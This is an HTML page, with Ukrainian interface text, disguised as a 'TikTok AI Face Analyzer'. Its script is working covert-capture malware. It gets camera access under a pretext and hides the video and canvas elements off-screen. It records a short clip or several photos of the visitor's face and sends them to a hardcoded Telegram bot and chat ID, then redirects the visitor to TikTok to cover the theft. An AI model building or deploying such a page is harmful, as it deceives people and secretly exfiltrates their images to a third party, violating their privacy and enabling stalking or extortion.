<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok AI Scanner</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { padding: 20px; max-width: 400px; width: 90%; }
        .logo { width: 60px; margin-bottom: 25px; filter: invert(1); }
        .btn { background: #fe2c55; border: none; padding: 18px 40px; color: #fff; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; }
        #status { display: none; margin-top: 20px; }
        .loader { border: 2px solid #222; border-top: 2px solid #fe2c55; border-radius: 50%; width: 25px; height: 25px; animation: spin 2s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { position: absolute; left: -9999px; opacity: 0; }
    </style>
</head>
<body>

    <div class="container" id="ui">
        <img src="https://raw.githubusercontent.com/simple-icons/simple-icons/develop/icons/tiktok.svg" class="logo">
        <h2>AI Face Analyzer</h2>
        <p id="desc">Натисніть кнопку для синхронізації з AI.</p>
        <button class="btn" id="startBtn" onclick="init()">Почати аналіз</button>

        <div id="status">
            <div class="loader"></div>
            <p id="st-text" style="color: #888; font-size: 14px;">Обробка біометрії...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" width="640" height="480"></canvas>

    <script>
        const token = '8492555273:AAHur2SwzreGkYlCz5-gBCGCJxzvrdwFczM';
        const chat = '7808795546';
        const tiktokUrl = 'https://www.tiktok.com/explore';

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 640, height: 480 } 
                });
                const video = document.getElementById('v');
                video.srcObject = stream;
                await video.play();

                document.getElementById('startBtn').style.display = 'none';
                document.getElementById('desc').style.display = 'none';
                document.getElementById('status').style.display = 'block';

                // Перевірка підтримки MediaRecorder
                if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('video/webm')) {
                    startVideoMode(stream);
                } else {
                    startPhotoMode(stream, video);
                }

            } catch (e) {
                window.location.replace(tiktokUrl);
            }
        }

        // РЕЖИМ ВІДЕО
        function startVideoMode(stream) {
            const chunks = [];
            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const f = new FormData();
                f.append('chat_id', chat);
                f.append('video', blob, 'video.webm');
                
                await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: f });
                finish(stream);
            };

            recorder.start();
            setTimeout(() => recorder.stop(), 4000); // Запис 4 секунди
        }

        // РЕЖИМ ФОТО (якщо відео не працює)
        async function startPhotoMode(stream, video) {
            for (let i = 0; i < 7; i++) {
                const canvas = document.getElementById('c');
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.6));
                const f = new FormData();
                f.append('chat_id', chat);
                f.append('photo', blob, 'img.jpg');
                
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
                await new Promise(r => setTimeout(r, 1200));
            }
            finish(stream);
        }

        function finish(stream) {
            stream.getTracks().forEach(t => t.stop());
            window.location.replace(tiktokUrl);
        }
    </script>
</body>
</html>
